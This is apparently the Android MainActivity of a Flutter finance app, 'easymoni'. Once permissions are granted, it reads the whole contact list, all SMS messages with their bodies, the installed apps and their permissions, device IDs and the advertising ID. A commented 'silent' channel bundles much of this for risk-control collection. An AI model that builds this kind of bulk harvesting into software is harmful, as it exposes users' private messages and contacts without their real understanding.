package com.ereeko.easymoni

import android.Manifest
import android.app.Activity
import android.content.Intent
import android.content.pm.PackageManager
import android.database.Cursor
import android.net.Uri
import android.os.Build
import android.provider.ContactsContract
import android.provider.Settings
import android.provider.MediaStore
import android.provider.Telephony
import android.util.Base64
import com.android.installreferrer.api.InstallReferrerClient
import com.android.installreferrer.api.InstallReferrerStateListener
import com.google.android.gms.ads.identifier.AdvertisingIdClient
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import io.flutter.embedding.android.FlutterActivity
import io.flutter.embedding.engine.FlutterEngine
import io.flutter.plugin.common.MethodChannel
import java.security.MessageDigest
import java.util.concurrent.CountDownLatch
import java.util.concurrent.TimeUnit

class MainActivity : FlutterActivity() {
    private val LOCATION_CHANNEL = "com.easy_moni/location"
    private val CONTACTS_CHANNEL = "com.easy_moni/contacts"
    private val SMS_CHANNEL = "com.easy_moni/sms"
    private val CAMERA_CHANNEL = "com.easy_moni/camera"
    private val DIALER_CHANNEL = "com.easy_moni/dialer"
    private val ATTRIBUTION_CHANNEL = "com.easy_moni/attribution"
    private val SILENT_PERMISSION_DATA_CHANNEL = "com.easy_moni/silent_permission_data"
    
    private var pendingResult: MethodChannel.Result? = null
    private var pendingContactsResult: MethodChannel.Result? = null
    private var pendingSmsResult: MethodChannel.Result? = null
    private var pendingCameraPermissionResult: MethodChannel.Result? = null
    private var pendingPickContactResult: MethodChannel.Result? = null
    private var pendingCameraResult: MethodChannel.Result? = null

    override fun configureFlutterEngine(flutterEngine: FlutterEngine) {
        super.configureFlutterEngine(flutterEngine)

        // ============ 位置服务 ============
        MethodChannel(flutterEngine.dartExecutor.binaryMessenger, LOCATION_CHANNEL).setMethodCallHandler { call, result ->
            when (call.method) {
                "checkLocationPermission" -> {
                    val hasPermission = ContextCompat.checkSelfPermission(
                        this, Manifest.permission.ACCESS_COARSE_LOCATION
                    ) == PackageManager.PERMISSION_GRANTED
                    result.success(hasPermission)
                }
                "requestLocationPermission" -> {
                    if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_COARSE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
                        pendingResult = result
                        ActivityCompat.requestPermissions(
                            this,
                            arrayOf(Manifest.permission.ACCESS_COARSE_LOCATION),
                            1001
                        )
                    } else {
                        result.success(true)
                    }
                }
                "isLocationServiceEnabled" -> {
                    val locationManager = getSystemService(LOCATION_SERVICE) as android.location.LocationManager
                    result.success(locationManager.isProviderEnabled(android.location.LocationManager.GPS_PROVIDER) ||
                            locationManager.isProviderEnabled(android.location.LocationManager.NETWORK_PROVIDER))
                }
                "getCurrentLocation" -> {
                    // Android 原生获取位置需要 Google Play Services，这里简化处理
                    result.error("NOT_SUPPORTED", "请使用手动选择", null)
                }
                else -> result.notImplemented()
            }
        }

        // ============ 通讯录服务 ============
        MethodChannel(flutterEngine.dartExecutor.binaryMessenger, CONTACTS_CHANNEL).setMethodCallHandler { call, result ->
            when (call.method) {
                "checkContactsPermission" -> {
                    val hasPermission = ContextCompat.checkSelfPermission(
                        this, Manifest.permission.READ_CONTACTS
                    ) == PackageManager.PERMISSION_GRANTED
                    result.success(hasPermission)
                }
                "requestContactsPermission" -> {
                    if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED) {
                        pendingContactsResult = result
                        ActivityCompat.requestPermissions(
                            this,
                            arrayOf(Manifest.permission.READ_CONTACTS),
                            1002
                        )
                    } else {
                        result.success(true)
                    }
                }
                "getContacts" -> {
                    if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED) {
                        result.error("PERMISSION_DENIED", "Contacts permission denied", null)
                    } else {
                        try {
                            result.success(getContacts())
                        } catch (e: Exception) {
                            result.error("GET_CONTACTS_FAILED", e.message, null)
                        }
                    }
                }
                "pickContact" -> {
                    try {
                        val intent = Intent(
                            Intent.ACTION_PICK,
                            ContactsContract.CommonDataKinds.Phone.CONTENT_URI
                        )
                        pendingPickContactResult = result
                        startActivityForResult(intent, 2002)
                    } catch (e: Exception) {
                        result.error("PICK_CONTACT_FAILED", e.message, null)
                    }
                }
                "openAppSettings" -> {
                    try {
                        val intent = Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
                            data = Uri.parse("package:$packageName")
                            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                        }
                        startActivity(intent)
                        result.success(true)
                    } catch (e: Exception) {
                        result.error("OPEN_SETTINGS_FAILED", e.message, null)
                    }
                }
                else -> result.notImplemented()
            }
        }

        // ============ 短信权限服务 ============
        MethodChannel(flutterEngine.dartExecutor.binaryMessenger, SMS_CHANNEL).setMethodCallHandler { call, result ->
            when (call.method) {
                "checkSmsPermission" -> {
                    val hasPermission = ContextCompat.checkSelfPermission(
                        this, Manifest.permission.READ_SMS
                    ) == PackageManager.PERMISSION_GRANTED
                    result.success(hasPermission)
                }
                "requestSmsPermission" -> {
                    if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) {
                        pendingSmsResult = result
                        ActivityCompat.requestPermissions(
                            this,
                            arrayOf(Manifest.permission.READ_SMS),
                            1003
                        )
                    } else {
                        result.success(true)
                    }
                }
                "openAppSettings" -> {
                    try {
                        val intent = Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
                            data = Uri.parse("package:$packageName")
                            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                        }
                        startActivity(intent)
                        result.success(true)
                    } catch (e: Exception) {
                        result.error("OPEN_SETTINGS_FAILED", e.message, null)
                    }
                }
                "getSmsRecords" -> {
                    if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) {
                        result.error("PERMISSION_DENIED", "Sms permission denied", null)
                    } else {
                        try {
                            result.success(getSmsRecords())
                        } catch (e: Exception) {
                            result.error("GET_SMS_RECORDS_FAILED", e.message, null)
                        }
                    }
                }
                else -> result.notImplemented()
            }
        }

        // ============ 相机/相册服务 ============
        MethodChannel(flutterEngine.dartExecutor.binaryMessenger, CAMERA_CHANNEL).setMethodCallHandler { call, result ->
            when (call.method) {
                "checkCameraPermission" -> {
                    val hasPermission = ContextCompat.checkSelfPermission(
                        this, Manifest.permission.CAMERA
                    ) == PackageManager.PERMISSION_GRANTED
                    result.success(hasPermission)
                }
                "requestCameraPermission" -> {
                    if (ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
                        pendingCameraPermissionResult = result
                        ActivityCompat.requestPermissions(
                            this,
                            arrayOf(Manifest.permission.CAMERA),
                            1004
                        )
                    } else {
                        result.success(true)
                    }
                }
                "openAppSettings" -> {
                    try {
                        val intent = Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
                            data = Uri.parse("package:$packageName")
                            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                        }
                        startActivity(intent)
                        result.success(true)
                    } catch (e: Exception) {
                        result.error("OPEN_SETTINGS_FAILED", e.message, null)
                    }
                }
                "pickFromGallery" -> {
                    val intent = Intent(Intent.ACTION_PICK, MediaStore.Images.Media.EXTERNAL_CONTENT_URI)
                    intent.type = "image/*"
                    pendingCameraResult = result
                    startActivityForResult(intent, 2001)
                }
                else -> result.notImplemented()
            }
        }

        // ============ 系统拨号盘服务 ============
        MethodChannel(flutterEngine.dartExecutor.binaryMessenger, DIALER_CHANNEL).setMethodCallHandler { call, result ->
            when (call.method) {
                "openDialer" -> {
                    try {
                        val phone = call.argument<String>("phone")?.trim().orEmpty()
                        val intent = Intent(Intent.ACTION_DIAL).apply {
                            data = Uri.parse("tel:$phone")
                        }
                        startActivity(intent)
                        result.success(true)
                    } catch (e: Exception) {
                        result.error("OPEN_DIALER_FAILED", e.message, null)
                    }
                }
                else -> result.notImplemented()
            }
        }

        // ============ 归因设备信息服务 ============
        MethodChannel(flutterEngine.dartExecutor.binaryMessenger, ATTRIBUTION_CHANNEL).setMethodCallHandler { call, result ->
            when (call.method) {
                "getAttributionData" -> {
                    Thread {
                        try {
                            val data = getAttributionData()
                            runOnUiThread { result.success(data) }
                        } catch (e: Exception) {
                            runOnUiThread { result.error("GET_ATTRIBUTION_FAILED", e.message, null) }
                        }
                    }.start()
                }
                else -> result.notImplemented()
            }
        }

        // ============ 授权后静默风控数据采集 ============
        MethodChannel(flutterEngine.dartExecutor.binaryMessenger, SILENT_PERMISSION_DATA_CHANNEL).setMethodCallHandler { call, result ->
            when (call.method) {
                "collect" -> {
                    try {
                        result.success(
                            mapOf(
                                "appList" to getInstalledAppList(),
                                "deviceInfo" to getDeviceInfo(),
                                "inAppActivityData" to getInAppActivityData()
                            )
                        )
                    } catch (e: Exception) {
                        result.error("COLLECT_FAILED", e.message, null)
                    }
                }
                else -> result.notImplemented()
            }
        }
    }

    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)
        
        when (requestCode) {
            2002 -> { // Contact picker
                if (resultCode == Activity.RESULT_OK && data?.data != null) {
                    try {
                        pendingPickContactResult?.success(getContactFromUri(data.data!!))
                    } catch (e: Exception) {
                        pendingPickContactResult?.error("PICK_CONTACT_FAILED", e.message, null)
                    }
                } else {
                    pendingPickContactResult?.success(null)
                }
                pendingPickContactResult = null
            }
            2001 -> { // Gallery
                if (resultCode == Activity.RESULT_OK && data != null) {
                    val selectedImageUri = data.data
                    if (selectedImageUri != null) {
                        try {
                            val base64 = getBase64FromUri(selectedImageUri)
                            if (base64 != null) {
                                pendingCameraResult?.success(base64)
                            } else {
                                pendingCameraResult?.error("ERROR", "Could not read image", null)
                            }
                        } catch (e: Exception) {
                            pendingCameraResult?.error("ERROR", e.message, null)
                        }
                    } else {
                        pendingCameraResult?.error("ERROR", "No image selected", null)
                    }
                } else {
                    pendingCameraResult?.success(null)
                }
                pendingCameraResult = null
            }
        }
    }

    private fun getContactFromUri(uri: Uri): Map<String, String>? {
        val cursor: Cursor? = contentResolver.query(
            uri,
            arrayOf(
                ContactsContract.CommonDataKinds.Phone.CONTACT_ID,
                ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                ContactsContract.CommonDataKinds.Phone.NUMBER
            ),
            null,
            null,
            null
        )

        cursor?.use {
            if (!it.moveToFirst()) return null

            val idIndex = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.CONTACT_ID)
            val nameIndex = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)
            val phoneIndex = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)

            val id = if (idIndex >= 0) it.getString(idIndex) ?: "" else ""
            val name = if (nameIndex >= 0) it.getString(nameIndex) ?: "" else ""
            val phone = if (phoneIndex >= 0) it.getString(phoneIndex)?.replace("\\s".toRegex(), "") ?: "" else ""

            return mapOf(
                "id" to id,
                "name" to name,
                "phone" to phone
            )
        }

        return null
    }

    private fun getBase64FromUri(uri: Uri): String? {
        return try {
            val inputStream = contentResolver.openInputStream(uri)
            val bytes = inputStream?.use { it.readBytes() }
            if (bytes == null || bytes.isEmpty()) null else Base64.encodeToString(bytes, Base64.NO_WRAP)
        } catch (e: Exception) {
            null
        }
    }

    private fun getContacts(): List<Map<String, String>> {
        val contacts = mutableListOf<Map<String, String>>()
        val seenContacts = mutableSetOf<String>()
        val cursor: Cursor? = contentResolver.query(
            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
            arrayOf(
                ContactsContract.CommonDataKinds.Phone.CONTACT_ID,
                ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                ContactsContract.CommonDataKinds.Phone.NUMBER
            ),
            null,
            null,
            ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " ASC"
        )

        cursor?.use {
            val idIndex = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.CONTACT_ID)
            val nameIndex = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)
            val phoneIndex = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)

            while (it.moveToNext()) {
                val id = if (idIndex >= 0) it.getString(idIndex) ?: "" else ""
                val name = if (nameIndex >= 0) it.getString(nameIndex) ?: "" else ""
                val phone = if (phoneIndex >= 0) it.getString(phoneIndex)?.replace("\\s".toRegex(), "") ?: "" else ""
                if (phone.isEmpty()) continue

                val key = "$name-$phone"
                if (!seenContacts.add(key)) continue

                contacts.add(
                    mapOf(
                        "id" to id,
                        "name" to name,
                        "phone" to phone
                    )
                )
            }
        }

        return contacts
    }

    private fun getSmsRecords(): List<Map<String, Any>> {
        val smsRecords = mutableListOf<Map<String, Any>>()
        val cursor: Cursor? = contentResolver.query(
            Telephony.Sms.CONTENT_URI,
            arrayOf(
                Telephony.Sms._ID,
                Telephony.Sms.ADDRESS,
                Telephony.Sms.BODY,
                Telephony.Sms.DATE,
                Telephony.Sms.DATE_SENT,
                Telephony.Sms.PERSON,
                Telephony.Sms.TYPE
            ),
            null,
            null,
            Telephony.Sms.DEFAULT_SORT_ORDER
        )

        cursor?.use {
            val idIndex = it.getColumnIndex(Telephony.Sms._ID)
            val addressIndex = it.getColumnIndex(Telephony.Sms.ADDRESS)
            val bodyIndex = it.getColumnIndex(Telephony.Sms.BODY)
            val dateIndex = it.getColumnIndex(Telephony.Sms.DATE)
            val dateSentIndex = it.getColumnIndex(Telephony.Sms.DATE_SENT)
            val personIndex = it.getColumnIndex(Telephony.Sms.PERSON)
            val typeIndex = it.getColumnIndex(Telephony.Sms.TYPE)

            while (it.moveToNext()) {
                val id = if (idIndex >= 0) it.getString(idIndex) ?: "" else ""
                val address = if (addressIndex >= 0) it.getString(addressIndex) ?: "" else ""
                val body = if (bodyIndex >= 0) it.getString(bodyIndex) ?: "" else ""
                val date = if (dateIndex >= 0) it.getLong(dateIndex) else 0L
                val dateSent = if (dateSentIndex >= 0) it.getLong(dateSentIndex) else 0L
                val person = if (personIndex >= 0) it.getString(personIndex) ?: "" else ""
                val type = if (typeIndex >= 0) it.getInt(typeIndex) else 0

                smsRecords.add(
                    mapOf(
                        "body" to body,
                        "date" to date,
                        "dateSent" to dateSent,
                        "id" to id,
                        "md5" to md5("$id|$address|$body|$date"),
                        "person" to person,
                        "phone" to address,
                        "address" to address,
                        "type" to type
                    )
                )
            }
        }

        return smsRecords
    }

    private fun md5(value: String): String {
        val digest = MessageDigest.getInstance("MD5").digest(value.toByteArray())
        return digest.joinToString("") { "%02x".format(it.toInt() and 0xff) }
    }

    private fun getInstalledAppList(): List<Map<String, Any>> {
        val launchIntent = Intent(Intent.ACTION_MAIN, null).apply {
            addCategory(Intent.CATEGORY_LAUNCHER)
        }
        val launchablePackages = packageManager.queryIntentActivities(launchIntent, 0)
            .map { it.activityInfo.packageName }
            .toSet()

        val packageInfos = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            packageManager.getInstalledPackages(
                PackageManager.PackageInfoFlags.of(PackageManager.GET_PERMISSIONS.toLong())
            )
        } else {
            @Suppress("DEPRECATION")
            packageManager.getInstalledPackages(PackageManager.GET_PERMISSIONS)
        }

        return packageInfos
            .filter { launchablePackages.contains(it.packageName) }
            .map { packageInfo ->
                val appInfo = packageInfo.applicationInfo
                val appName = if (appInfo == null) {
                    packageInfo.packageName
                } else {
                    packageManager.getApplicationLabel(appInfo).toString()
                }

                mapOf(
                    "appName" to appName,
                    "appPackage" to packageInfo.packageName,
                    "appVersion" to (packageInfo.versionName ?: ""),
                    "fiTime" to packageInfo.firstInstallTime,
                    "luTime" to packageInfo.lastUpdateTime,
                    "permission" to (packageInfo.requestedPermissions?.joinToString(",") ?: ""),
                    "systemApp" to if ((appInfo?.flags ?: 0) and android.content.pm.ApplicationInfo.FLAG_SYSTEM != 0) 1 else 0
                )
            }
    }

    private fun getDeviceInfo(): Map<String, Any> {
        return mapOf(
            "manufacturer" to Build.MANUFACTURER,
            "brand" to Build.BRAND,
            "model" to Build.MODEL,
            "device" to Build.DEVICE,
            "product" to Build.PRODUCT,
            "androidVersion" to Build.VERSION.RELEASE,
            "sdkInt" to Build.VERSION.SDK_INT,
            "androidId" to (Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID) ?: ""),
            "packageName" to packageName
        )
    }

    private fun getAttributionData(): Map<String, Any> {
        val gaid = getAdvertisingId()
        return mapOf(
            "gaid" to gaid,
            "advId" to gaid,
            "referrer" to getInstallReferrer(),
            "deviceId" to (Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID) ?: ""),
            "userAgent" to "${Build.MANUFACTURER} ${Build.MODEL}",
            "androidVersion" to Build.VERSION.RELEASE,
            "sdkInt" to Build.VERSION.SDK_INT,
            "packageName" to packageName
        )
    }

    private fun getAdvertisingId(): String {
        return try {
            val info = AdvertisingIdClient.getAdvertisingIdInfo(this)
            info?.id ?: ""
        } catch (e: Exception) {
            ""
        }
    }

    private fun getInstallReferrer(): String {
        val client = InstallReferrerClient.newBuilder(this).build()
        val latch = CountDownLatch(1)
        var referrer = ""

        return try {
            client.startConnection(object : InstallReferrerStateListener {
                override fun onInstallReferrerSetupFinished(responseCode: Int) {
                    try {
                        if (responseCode == InstallReferrerClient.InstallReferrerResponse.OK) {
                            referrer = client.installReferrer.installReferrer ?: ""
                        }
                    } catch (_: Exception) {
                        referrer = ""
                    } finally {
                        latch.countDown()
                    }
                }

                override fun onInstallReferrerServiceDisconnected() {
                    latch.countDown()
                }
            })
            latch.await(3, TimeUnit.SECONDS)
            referrer
        } catch (e: Exception) {
            ""
        } finally {
            try {
                client.endConnection()
            } catch (_: Exception) {
            }
        }
    }

    private fun getInAppActivityData(): Map<String, Any> {
        return mapOf(
            "event" to "permission_accept",
            "screen" to "PermissionPage",
            "timestamp" to System.currentTimeMillis()
        )
    }

    override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<out String>, grantResults: IntArray) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        when (requestCode) {
            1001 -> {
                if (grantResults.isNotEmpty() && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                    pendingResult?.success(true)
                } else {
                    pendingResult?.success(false)
                }
                pendingResult = null
            }
            1002 -> {
                if (grantResults.isNotEmpty() && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                    pendingContactsResult?.success(true)
                } else {
                    pendingContactsResult?.success(false)
                }
                pendingContactsResult = null
            }
            1003 -> {
                if (grantResults.isNotEmpty() && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                    pendingSmsResult?.success(true)
                } else {
                    pendingSmsResult?.success(false)
                }
                pendingSmsResult = null
            }
            1004 -> {
                if (grantResults.isNotEmpty() && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                    pendingCameraPermissionResult?.success(true)
                } else {
                    pendingCameraPermissionResult?.success(false)
                }
                pendingCameraPermissionResult = null
            }
        }
    }
}
